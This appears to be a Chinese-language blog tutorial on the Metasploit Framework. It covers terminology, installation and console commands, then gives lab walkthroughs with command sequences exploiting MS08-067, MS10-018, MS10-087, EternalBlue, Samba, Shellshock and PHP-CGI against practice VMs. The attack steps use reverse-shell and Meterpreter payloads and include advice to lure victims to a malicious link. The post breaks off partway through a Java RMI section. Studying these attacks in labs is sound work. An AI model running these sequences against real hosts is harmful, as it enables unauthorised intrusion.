<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="一.初识    MSF                           1.1什么是Metasploit       Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D.">
<meta property="og:type" content="article">
<meta property="og:title" content="MSF框架">
<meta property="og:url" content="https://sculptor-liu.github.io/2020/07/04/MSF/index.html">
<meta property="og:site_name" content="Sculptor&#39;s blog">
<meta property="og:description" content="一.初识    MSF                           1.1什么是Metasploit       Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D.">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-07-04T12:39:11.571Z">
<meta property="article:modified_time" content="2020-10-10T07:12:52.188Z">
<meta property="article:author" content="Sculptor">
<meta property="article:tag" content="MSF">
<meta name="twitter:card" content="summary"><title>MSF框架 | Sculptor's blog</title><link ref="canonical" href="https://sculptor-liu.github.io/2020/07/04/MSF/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: true,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-info-circle"></i></span><span class="header-nav-menu-item__text">关于我</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Sculptor's blog</div><div class="header-banner-info__subtitle">不知名的陌生人</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">MSF框架</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-07-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-10-10</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="一-初识-MSF">
          <a href="#一-初识-MSF" class="heading-link"><i class="fas fa-link"></i></a>一.初识    MSF</h1>
      
        <h2 id="1-1什么是Metasploit">
          <a href="#1-1什么是Metasploit" class="heading-link"><i class="fas fa-link"></i></a>1.1什么是Metasploit</h2>
      <p>Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时,计算机安全状况也被永久性地改变了。仿佛一夜之间， 任何人都可以成为黑客,每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补J的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具,并将它们贡献给所有MSF用户。<br>MSF的设计初衷是打造成一个攻击工具开发平台 ,然而在目前情况下,安全专家以及业余安全爱好者更多地将其当作种点几下 鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p>
<a id="more"></a>

        <h2 id="1-2MSF专业术语讲解">
          <a href="#1-2MSF专业术语讲解" class="heading-link"><i class="fas fa-link"></i></a>1.2MSF专业术语讲解</h2>
      
        <h3 id="1-2-1渗透攻击-Exploit">
          <a href="#1-2-1渗透攻击-Exploit" class="heading-link"><i class="fas fa-link"></i></a>1.2.1渗透攻击(Exploit)</h3>
      <p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>流行的攻击技术包括:缓冲区溢出、Web应用程序漏洞攻击,以及利用配置错误等。</p>

        <h3 id="1-2-2攻击载荷-Payload">
          <a href="#1-2-2攻击载荷-Payload" class="heading-link"><i class="fas fa-link"></i></a>1.2.2攻击载荷(Payload)</h3>
      <p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码，在框架中可以自由的选择、传送和植入。比如，反弹式shell 是一种从目标主机到攻击主机创建网络连接,并提供命令行shell 的攻击载荷。bind shell 攻击载荷则在目标主机上将命令行shell 绑定到一个打开的监听端口,攻击者可以连接这些端口来取得shell交互。</p>

        <h3 id="1-2-3溢出代码-Shellcode">
          <a href="#1-2-3溢出代码-Shellcode" class="heading-link"><i class="fas fa-link"></i></a>1.2.3溢出代码(Shellcode)</h3>
      <p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下,目标系统执行了shellcode这一组指令后 才会提供一个命令行shell或者Meterpreter shell ,这也是shellcode名称的由来。</p>

        <h3 id="1-2-4模块-Module">
          <a href="#1-2-4模块-Module" class="heading-link"><i class="fas fa-link"></i></a>1.2.4模块( Module)</h3>
      <p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候,你可能会使用一个渗透攻击模块( Exploit module ).也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用个辅助模块( auxiliary module ).用来扫描一些诸如扫描或系统查点的攻击动作。</p>

        <h3 id="1-2-5监听器-Listener">
          <a href="#1-2-5监听器-Listener" class="heading-link"><i class="fas fa-link"></i></a>1.2.5监听器(Listener)</h3>
      <p>监听器是MSF中用来等待连入网络连接的组件。举例来说,在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p>

        <h1 id="二-更新MSF以及目录结构">
          <a href="#二-更新MSF以及目录结构" class="heading-link"><i class="fas fa-link"></i></a>二.更新MSF以及目录结构</h1>
      
        <h2 id="2-1-如何更新MSF">
          <a href="#2-1-如何更新MSF" class="heading-link"><i class="fas fa-link"></i></a>2.1.如何更新MSF</h2>
      <p>首先，替换源，可以换成阿里源，将原本的源用#注释掉，因为国内访问它的源太慢。</p>
<p>然后，添加数字签名。</p>
<p>有时候会出现故障，就得把老的MSF卸载：apt remove metasploit-framework</p>
<p>更新命令：apt-get update（这些都是在msf中执行的命令）</p>
<p>安装MSF框架：apt-get install metasploit-framework</p>
<p>进入msf：msfconsole</p>
<p>若提示没有相应的数据库支持：quit (退出msf)</p>
<p>启动数据库：systemctl start postgresql</p>
<p>允许开机自启：systemctl enable postgresql</p>
<p>构建数据库缓存：msfdb init</p>

        <h2 id="2-2-MSF的目录结构">
          <a href="#2-2-MSF的目录结构" class="heading-link"><i class="fas fa-link"></i></a>2.2.MSF的目录结构</h2>
      <p>MSF 在BT5下存放目录：/opt/MSF</p>
<p>MSF 在kali 下存放目录：/usr/share/metasploit-framework/</p>

        <h2 id="2-3-Modules-模块">
          <a href="#2-3-Modules-模块" class="heading-link"><i class="fas fa-link"></i></a>2.3.Modules(模块)</h2>
      <p>存放路径：/usr/share/metasploit-framework/modules/(个人写的模块也可以存放在这里)</p>

        <h3 id="2-3-1-Auxiliary">
          <a href="#2-3-1-Auxiliary" class="heading-link"><i class="fas fa-link"></i></a>2.3.1.Auxiliary</h3>
      <p>主要包含渗透测试中一些辅助性的脚本，这些即本功能有扫描，嗅探，破解，注入，漏洞挖掘等。</p>

        <h3 id="2-3-2-Encoders">
          <a href="#2-3-2-Encoders" class="heading-link"><i class="fas fa-link"></i></a>2.3.2.Encoders</h3>
      <p>各种编码工具用于躲过入侵检测和过滤系统。</p>

        <h3 id="2-3-3-Exploits">
          <a href="#2-3-3-Exploits" class="heading-link"><i class="fas fa-link"></i></a>2.3.3.Exploits</h3>
      <p>主要包含了传说中的exp、0day. 各种漏洞利用的脚本。主要的攻击代码全在这，这里边包含的exp的路径的命名规则是系统/服务/模块，在使用exp是可以根据这个命名方法来找(也可以用search这条指令来找)比如:use exploits/windows(系统)/vnc(服务)/realvnc_client(模块名)</p>

        <h3 id="2-3-4-Nops">
          <a href="#2-3-4-Nops" class="heading-link"><i class="fas fa-link"></i></a>2.3.4.Nops</h3>
      <p>NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x9…)则会因为被拦截而导致攻击失效，所以此时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的NOPS生成脚本,就会发现它只是返回了指定长度的空格而已。(不理解没关系)。</p>

        <h3 id="2-3-5-Payloads">
          <a href="#2-3-5-Payloads" class="heading-link"><i class="fas fa-link"></i></a>2.3.5.Payloads</h3>
      <p>这个单词翻译过来叫载荷:是攻击者发送给系统执行的指令(不包含exploits 攻击阶段) , payloads主要是在目标机执行的,而exploits是在本地机执行作用于目标机。命名规则是:系统/类型/名称比如: use payloads/windows/shell/bind_tcp.</p>

        <h3 id="2-3-6-Post">
          <a href="#2-3-6-Post" class="heading-link"><i class="fas fa-link"></i></a>2.3.6.Post</h3>
      <p>这个目录里放着msf的exploits执行成功后,向目标机发送的一些功能性指令,比如:提权,获取hash等。</p>

        <h3 id="2-3-7-Data">
          <a href="#2-3-7-Data" class="heading-link"><i class="fas fa-link"></i></a>2.3.7.Data</h3>
      <p>这个目录里盛放了Meterpreter、PassiveX、 Vnc、 DLLS 等这些工具和一些用户接口代码, Msfweb和一些其他模块用到的数据文件。</p>
<p>Data下js文件夹下的Detect ,这里面存放的是MSF的探针文件。如果看过MSF浏览器攻击脚本的代码,就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码,否则中断。Memory中主要是一些堆喷射代码。 在大部分浏览器漏洞利用过程,堆喷射是一个不可或缺的过程(当然不是绝对的! )。并且不同的浏览器及版本间,堆喷射代码都有所不同。</p>

        <h3 id="2-3-8-Plugins">
          <a href="#2-3-8-Plugins" class="heading-link"><i class="fas fa-link"></i></a>2.3.8.Plugins</h3>
      <p>这里的模块用户需要使用load来加载提供数据库连接插件和各种要用到的插件。</p>

        <h3 id="2-3-9-Scripts">
          <a href="#2-3-9-Scripts" class="heading-link"><i class="fas fa-link"></i></a>2.3.9.Scripts</h3>
      <p>这个目录下的文件大都是Meterpreter这个模块利用的脚本，比如Meterpreter里用到的migrate来转移到其他进程的指令的源代码就在这个目录下。</p>
<p>这里的rc脚本相当于Windows下的批处理脚本, 在某些情况下会有一定便捷性。比如Veil 在生成免杀payload的同时也会生成一个rc脚本，此时使用msfconsole -r xx.rc便可以快速的建立一个和payload对应的handler ,亦或在攻击过程中需要你反复的set exploit,那么就可以使用这个批处理脚本了,而这个目录下则是一些给定的rc脚本,虽然你可能不习惯这样使用,但作为改写自己的rc脚本的资源也不错。</p>

        <h3 id="2-3-10-TOOLS">
          <a href="#2-3-10-TOOLS" class="heading-link"><i class="fas fa-link"></i></a>2.3.10.TOOLS</h3>
      <p>包含一些有用的脚本和零散的工具。</p>

        <h1 id="三-MSF基本命令">
          <a href="#三-MSF基本命令" class="heading-link"><i class="fas fa-link"></i></a>三.MSF基本命令</h1>
      
        <h2 id="3-1-Msfconsole控制台">
          <a href="#3-1-Msfconsole控制台" class="heading-link"><i class="fas fa-link"></i></a>3.1.Msfconsole控制台</h2>
      <p>它是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项。MSF起初看似吓人的,但一旦你学习他的语法命令,你将会欣赏利用该接的力量。</p>

        <h2 id="3-2-Msfconsole的好处">
          <a href="#3-2-Msfconsole的好处" class="heading-link"><i class="fas fa-link"></i></a>3.2.Msfconsole的好处</h2>
      <p>这是唯一能访问大多数支持在MSF特点。</p>
<p>Console- based界面提供了一个框架。</p>
<p>具有最稳定的MSF界面。</p>
<p>充分支持Readline，Tabbing以及其他各类命令。</p>
<p>支持Msfconsole外部命令执行。</p>

        <h2 id="3-3-Msfconsole命令">
          <a href="#3-3-Msfconsole命令" class="heading-link"><i class="fas fa-link"></i></a>3.3.Msfconsole命令</h2>
      <p>？：命令帮助，可以使用的命令</p>
<p>在？后面加命令(和前面的？有空格)：可以解释该命令的含义</p>
<p>search：搜索模块名和描述</p>
<p>use：+模块路径和模块本身  -&gt;使用该模块</p>
<p>进入模块：info -&gt; 查阅该模块信息      / check  -&gt;   检测</p>
<p>back：从当前环境（模块环境）返回 ，返回到上一级目录（类似于 .. )</p>
<p>banner：显示MSF的banner的信息</p>
<p>color：颜色转换</p>
<p>connect：+IP地址或者域名+端口号   -&gt; 连接主机</p>
<p>exit/quit：退出MSF</p>
<p>irb：进入irb脚本模式</p>
<p>jobs：显示和管理作业（和windows下的任务管理器的进程作用一样）</p>
<p>kill：+进程名字 -&gt; 杀死一个作业（和结束进程作用一样）</p>
<p>loadpath：加载一个模块的路径</p>
<p>load：加载一个插件</p>
<p>upload：卸载一个模块</p>
<p>resource：运行储存一个文件中的命令</p>
<p>route：查看一个会话的路由信息</p>
<p>save：保存动作</p>
<p>set：给一个变量赋值   （如：set RHOST 192.168.133.133)</p>
<p>unset：解除一个或多个变量</p>
<p>setg：把一个赋值给全局变量，例如上述的set 设置的IP，就会用到其他攻击模块的RHOST中。</p>
<p>unsetg：解除一个或多个全局变量</p>
<p>sleep：在限定秒数内什么也不做</p>
<p>show：显示所有类型的模块</p>
<p>version：显示MSF和控制台库的版本</p>

        <h1 id="四-Exploits-And-Payloads-模块">
          <a href="#四-Exploits-And-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>四.Exploits And Payloads 模块</h1>
      <p>show + 模块名(s) -&gt; 查看该模块下可以使用的</p>

        <h2 id="4-1-Exploits-模块">
          <a href="#4-1-Exploits-模块" class="heading-link"><i class="fas fa-link"></i></a>4.1.Exploits 模块</h2>
      <p>命名规则:系统/服务/名称<br>例如: windows/smb/ms08_067_netapi </p>
<p>RHOST :目标主机IP地址</p>
<p>RPORT :目标主机连接端口。</p>
<p>Payload :有效的载荷,成功后返回shell.</p>
<p>LHOST :攻击者的IP地址（我们自己就是攻击者）</p>
<p>LPORT :攻击者的端口</p>
<p>SRVHOST：攻击者自己搭建的服务器的IP地址</p>
<p>SRVPORT：攻击者自己搭建的服务器的端口号</p>
<p>SSL：证书</p>
<p>URIPATH：路径</p>

        <h2 id="4-2-Payloads-模块">
          <a href="#4-2-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>4.2.Payloads 模块</h2>
      <p>是在使用一个模块之后再去使用的。</p>
<p>命名规则:系统/类型/名称<br>例如: Windows/dllinject/reverse tcp.</p>
<p>类型命名规则<br>shell：上传一个shell,。<br>dllinject：注入一个dll到进程。<br>patchup*** ：修补漏洞。。<br>upexec：上传并执行一个文件。<br>meterpreter ：高级的payload。<br>vncinject ：高级的payload。<br>passive ：高级的payload。</p>
<p>名称的命名规则<br>shell find tag在一个已建立的连接上创建一个shell,<br>shell reverse_tcp:反向连接到攻击者主机并创建一个shell<br>bind_tcp:监听一个tcp连接。<br>reverse_tcp:反向建立tcp连接。<br>reverse_http通过HTTP隧道通信并创建一个新用户添加到管理组。<br>add_user创建一个新用户并添加到管理组。<br>xxx_ipv6_tcp:基于IPV6<br>xxx_nonx_tcp:no execute或win7 ( NX是应用在CPU的一种可以防止缓冲区溢出的技术)<br>xxx_ord_tcp:有序payload。<br>xxx_tcp_allports:在所有可能的端口。</p>

        <h1 id="五-MSF漏洞实例测试">
          <a href="#五-MSF漏洞实例测试" class="heading-link"><i class="fas fa-link"></i></a>五.MSF漏洞实例测试</h1>
      <p>三种攻击实例</p>

        <h2 id="5-1-网络服务器攻击渗透（MS08-067">
          <a href="#5-1-网络服务器攻击渗透（MS08-067" class="heading-link"><i class="fas fa-link"></i></a>5.1.网络服务器攻击渗透（MS08_067)</h2>
      <p>用到的靶机：WinXPenSP3</p>
<p>首先，执行msfconsole命令：msfconsole</p>
<p>接着，搜索ms08_067目录：search ms08_067</p>
<p>然后，</p>

        <h2 id="5-2-浏览器攻击渗透（MS10-018">
          <a href="#5-2-浏览器攻击渗透（MS10-018" class="heading-link"><i class="fas fa-link"></i></a>5.2.浏览器攻击渗透（MS10_018)</h2>
      <p>用到的靶机：WinXPenSP3</p>
<p>首先，执行msfconsole命令：msfconsole</p>
<p>接着，搜索ms10_018目录,搜索模块路径：search ms10_018</p>
<p>然后，进入搜索到的模块：use + 模块路径</p>
<p>查看该模块使用以及会影响win的详细信息：show options</p>
<p>设置自己服务器IP：set SRVHOST + IP地址(这里就填kali的IP，一般来说填公网IP地址)</p>
<p>设置一下端口，为了方便识别：例如：set LPORT 4441</p>
<p>设置一个payload正向连接shell：例如：set PAYLOAD windows/meterpreter/bind_tcp</p>
<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）</p>
<p>run 一下，会有一个 url 地址，这个地址就是要通过社工等方法让目标机进行访问（抛出一个诱导，让肉机访问）（当肉机点击访问后，我们就有可能得到肉机的系统权限）</p>
<p>查看我们得到的肉机信息：sessions -i</p>
<p>进入肉机系统：sessions -i +肉机编号（看有多少台机器上钩）</p>

        <h2 id="5-3-应用软件格式渗透，利用word去渗透（MS10-087">
          <a href="#5-3-应用软件格式渗透，利用word去渗透（MS10-087" class="heading-link"><i class="fas fa-link"></i></a>5.3.应用软件格式渗透，利用word去渗透（MS10_087)</h2>
      <p>用到的靶机：WinXPenSP3</p>
<p>首先，执行msfconsole命令：msfconsole</p>
<p>接着，搜索ms10_087目录,搜索模块路径：search ms10_087</p>
<p>然后，使用这个模块：use + 模块及它的路径</p>
<p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p>
<p>设置需要设置的信息，显然这个模块要设置文件名（如果不设置就是保持它原本的默认名）</p>
<p>设置一个payload，前面我们都是设置的交互式的，这里我们换一个payload：例如：set payload windows/exec</p>
<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项</p>
<p>这里出现还要我们设置CMD：这是处于win类似元终端执行的命令，比如我们执行弹出一个计算器：set CMD calc.exe</p>
<p>run一下，我们就会得到word文档，就是我们之前自己设计的文件名，它会告诉我们生成文件的位置</p>
<p>然后我们可以把它拷贝到home里：home:mv +文件路径/home/，然后再托到本机，就可以看出效果了</p>

        <h2 id="5-4-网路服务器攻击渗透测试（MS17-010">
          <a href="#5-4-网路服务器攻击渗透测试（MS17-010" class="heading-link"><i class="fas fa-link"></i></a>5.4.网路服务器攻击渗透测试（MS17_010)</h2>
      <p>用到的靶机：Win7</p>
<p>首先，执行msfconsole命令：msfconsole</p>
<p>接着，搜索ms17_010目录,搜索模块路径：search ms17_010（这个就是之前的永恒之蓝）</p>
<p>然后，使用这个模块：use + 模块及它的路径</p>
<p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p>
<p>设置需要设置的信息：set RHOST，LHOST(这个不是必须设置的，要求上没有它，但是还是设置一下)</p>
<p>设置一个payload，设置一个64位的：set payload windows/x64/meterpreter/reverse_tcp（反向连接，只要被攻击机存在漏洞时，就会反向连接到攻击机上）</p>
<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项。</p>
<p>run一下，当我们进入了meterpreter模式，就说明我们拿到了shell，shell 一下，我们就直接进入到别人的系统</p>

        <h2 id="5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）">
          <a href="#5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）" class="heading-link"><i class="fas fa-link"></i></a>5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）</h2>
      <p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 ，由服务器及客户端程序构成samba服务对应的端口有139，445等等。本文将简单介绍metasploit利用samba漏洞入侵进入远程linux主机。</p>
<ol>
<li><p>首先要扫描目标主机上开放的端口和服务,用nmap,命令如下:<br>nmap -sS -Pn -A 192.168.133.133</p>
</li>
<li><p>发现主机上开放的139 , 445端口之后,说明该主机有可能存在samba服务远程溢出漏河，尝试通过该端口建立一个meterpreter会话，需要用到metasploit。</p>
</li>
<li><p>打开metasploit之后需要先判断samba的版本，命令如下:</p>
<p>msf&gt; search auxiliary/scanner/samba </p>
<p>这条命令用来查找samba相关exploit 参数</p>
</li>
<li><p>然后使用如下命令来定义要扫描samba的版本所用到的exploits参数</p>
<p>msf&gt; use auxiliary/scanner/smb/smb_version</p>
<p>msfauxiliary(smb_version) &gt; set RHOSTS 192.168.133.xxx（这两步是扫描这个肉鸡是否能被攻击）</p>
<p>这条命令定义你将要扫描samba版本的远程主机的IP地址。</p>
<p>exploit  ：开始漏洞利用</p>
</li>
<li><p>发现samba版本之后,我们需要进一步利用来入侵进入到远程linux主机</p>
<p>msf&gt; use exploit/multi/samba/usermap_script<br>msf exploit(usermap_script) &gt; set RHOST 192.168.133.xxx</p>
<p>msf exploit(usermap script) &gt; exploit</p>
<p>执行完成以上命令如图所示,成功创建了shell 会话。</p>
</li>
</ol>
<p>（二）smb 其他漏洞 Linux smb 漏洞（CVE-2017-7494）复现</p>
<p>漏洞编号： CVE-2017- 7494.<br>漏洞等级：严重<br>影响版本：漏洞影响了Samba 3.5.0之后的版本，不包含4.6.4/4.5.10/4.4.14</p>
<ol>
<li><p>查看samba版本</p>
<p>samba -V     #查看samba版本</p>
</li>
<li><p>打开samba配置文件添加以下配置，配置共享：</p>
<p>vi /etc/samba/smb.conf</p>
<p>在末行加入：</p>
<p>[public]</p>
<pre><code>comment = public
browseable = yes
writeable =yes
path = /tmp/public
public = yes
read only = no</code></pre>
<p>:wq  #保存退出</p>
</li>
<li><p>Kali Linux 2017里面创建Samnba共享目录，创建共享目录</p>
<p>创建共享目录：mkdir /tmp/public</p>
<p>修改执行读写权限：chmod 777 /tmp/public/</p>
<p>这是 SambaCry 漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在共享目录下传递攻击代码并执行，获得root 权限并控制肉鸡。</p>
</li>
<li><p>Kali Linux 2017 重启/ 启动 Samba 服务</p>
<p>重启 Samba 服务：/etc/init.d/samba restart</p>
<p>查看 Samba 进程：ps aux | grep samba</p>
<p>查看Samba 端口状态：netstat -tnlp samba（采用445和139端口）</p>
</li>
<li><p>更新MSF 后使用”exploit/linux/samba/is_known_pipename”利用模块，设置 rhost 后直接 exploit 即可得到 shell</p>
</li>
</ol>
<p>注意：有的 poc 会存在32位和64位之分，1-4的步骤是在肉鸡上的操作（被攻击的Linux机）</p>

        <h2 id="5-6-Bash-Shellshock-CVE-2014-6271（破壳）">
          <a href="#5-6-Bash-Shellshock-CVE-2014-6271（破壳）" class="heading-link"><i class="fas fa-link"></i></a>5.6.Bash Shellshock CVE_2014_6271（破壳）</h2>
      <p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞。启动Bash的时候不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中,数据是通过环境变量来传递的,这样就给了数据提供者利用Shellshock漏洞的机会。</p>
<p>简单来说就是由于服务器的cgi脚本调用了bash命令,由于bash版本过低,攻击者把有害数据写入环境变量,传到服务器端,触发服务器运行Bash脚本,完成攻击。</p>
<p><strong>本次实战环境：</strong></p>
<p>metasploitable2 是一个非常不错的靶机 ,内置了多种漏洞来练习你的黑客技术。我将在独立网络环境中使用kali来攻击它,建议你也跟我一样, 确保在第一次尝试攻击时结果和我一样，等技术娴熟后就可以渗透真实的机器了。</p>
<ol>
<li><p>第一步：配置靶机</p>
<p>要利用此漏洞，要在 cgi-bin 目录下有一个可执行脚本，一个简单的输出 ”hello world ”脚本即可，因为仅仅是作为演示，进入靶机的 /usr/lib/cgi-bin/ 目录下，输入以下命令：</p>
<p>命令：sudo nano hello.sh</p>
<p>输入正确的密码后，对hello.sh 进行编辑：</p>
<p>#! /bin/bash</p>
<p>echo “Content-type:text/html”</p>
<p>echo “”</p>
<p>echo “Hello World !”</p>
<p>保存好后，赋予脚本可执行权限，用 chmod 命令：sudo chmod 775 hello.sh</p>
<p>我们来验证以下，通过浏览器访问该脚本，可以看到已经成功执行:192.168.133.139/cgi-bin/hello.sh</p>
</li>
<li><p>第二步：准备攻击</p>
<p>在kali中，进入 metasploit ：msfconsole</p>
<p>我们可以通过 search 来搜索 exploits ，输入search shellshock ,这样就能搜索到 apache_mod_cgi_bash_env_exec 模块</p>
<p>输入 ：show options 来查看该模块要配置的东西</p>
<p>大部分是选择默认配置，这里只要配置远程 RHOSTS ，本地监听的IP  LHOST和文件路径 targeturi ：set targeturi /cgi-bin/hello.sh</p>
<p>设置了本地IP LHOST，就得设置payload ，命令：set payload linux/x86/shell/reverse_tcp</p>
</li>
<li><p>第三步：getshell</p>
<p>一些 metasploit 模块有一个非常便利的小功能，就是检测靶机是否有漏洞，输入 check 命令检测即可，这将会把靶机是否存漏洞检测出来。</p>
<p>输入：exploit 命令进行攻击</p>
</li>
</ol>

        <h2 id="5-7-PHP-CGI-漏洞利用">
          <a href="#5-7-PHP-CGI-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.7.PHP CGI 漏洞利用</h2>
      <p>一般通过 phpinfo 来查看是否符合CGI漏洞利用，通常看 Server API ：CGI / *，CGI是服务器的扩展功能（比如：留言板提交，IIS/Windows 的php 要用到）</p>
<p>靶机：metasploitable2</p>
<p>命令：</p>
<p>msf &gt; search cve:2012-1823</p>
<p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p>
<p>msf exploit(php_cgi_arg_injection) &gt;show options</p>
<p>msf exploit(php_cgi_arg_injection) &gt; set RHOSTS 192……</p>
<p>msf exploit(php_cgi_arg_injection) &gt; run(或者exploit)</p>

        <h2 id="5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422">
          <a href="#5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422" class="heading-link"><i class="fas fa-link"></i></a>5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422</h2>
      <p>Java RMI SERVER 的 RMI 注册表 和 RMI 激活服务的默认配置存在安全漏洞，导致代码执行</p>
<p>利用步骤：</p>
<p>nmap -p0-65535 IP，查看 1099 端口是否开启</p>
